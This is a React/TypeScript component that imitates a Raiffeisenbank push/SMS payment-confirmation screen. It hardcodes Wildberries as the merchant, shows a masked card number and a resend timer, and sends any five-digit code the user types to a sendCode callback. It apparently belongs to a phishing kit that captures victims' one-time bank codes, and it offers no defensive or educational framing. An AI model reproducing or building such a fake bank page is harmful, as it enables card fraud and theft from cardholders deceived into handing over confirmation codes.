import React, {useState, useEffect} from 'react'
import styles from './RaiffeisenbankPush.module.scss'
import CountUp from 'react-countup';


type Card = {
    paymentSystem: string;
    cardNumber: string;
    bank: string;
    system: string
  }
interface Props{
    cardDetails: Card;
    totalPrice: number
    sendCode: (value: string) => void;
}

const RaiffeisenbankPush = ({totalPrice, cardDetails, sendCode}: Props) => {

    const [seconds, setSeconds] = useState(60);
    const [canResend, setCanResend] = useState(false);
    let currentDate = new Date();
    let day = String(currentDate.getDate()).padStart(2, '0');
    let month = String(currentDate.getMonth() + 1).padStart(2, '0'); 
    let year = currentDate.getFullYear();
    let formattedDate = `${day}.${month}.${year}`;
    const [code, setCode] = useState('')

    function formatCardNumber(cardNumber: string): string {
        return cardNumber.slice(0, 4) + ' XXXX XXXX ' + cardNumber.slice(-4);
    }
    useEffect(() => {
        if (seconds > 0) {
          const timer = setTimeout(() => setSeconds(seconds - 1), 1000);
          return () => clearTimeout(timer);
        } else {
          setCanResend(true);
        }
      }, [seconds]);

    const startTimer = () => {
        setCanResend(false);
        setSeconds(60);
      }
    
      const handleClick = () => {
        if (canResend) {
          startTimer();
        }
      }

      useEffect(() => {
       if(code.length === 5){
        sendCode(code)
       }
      }, [code, sendCode])
      

  return (
    <div className={styles.raiffeisenbankContainer}>
    <div className={styles.logo}>
          <div className={styles.Slogo}>
          <img src={`https://mrbin.io/bins/logo/main/e838ab69-f39b-4b3a-b2ba-0735225a20c4/1.svg`} alt='' className='bank-logo'/>
          </div>
       
     </div> 

     <div className={styles.price}><CountUp end={totalPrice} duration={0.4} separator=" "/> ₽</div>
      <div className={styles.orderDetails}>
          <div className={styles.detailsItem}>
              <p>Магазин</p>
              <span>Wildberries</span>
          </div>
          <div className={styles.detailsItem}>
              <p>Дата</p>
              <span>{formattedDate}</span>
          </div>
          <div className={styles.detailsItem}>
              <p>Номер карты</p>
              <span>{formatCardNumber(cardDetails.cardNumber)}</span>
          </div>
      </div>

      <input type="tel" placeholder='Введите код' className={styles.codeInput}  maxLength={5} onKeyPress={(e) => {
        if (!/[0-9]/.test(e.key)) {
            e.preventDefault();
        }
    }} value={code} onChange={(e)=>setCode(e.target.value)}/>
     <div className={styles.info}>
      Код отправлен PUSH-сообщением на устройство с R-Online либо в SMS <br /><span style={{cursor: 'pointer'}} onClick={handleClick}>
      {canResend ? 'Отправить код повторно' : <>Повторно код можно будет отправить<br />через {seconds} сек.</>}
    </span>
     </div>
     <div className={styles.cancelPayment}>Отменить оплату</div>
  </div>
  )
}

export default RaiffeisenbankPush
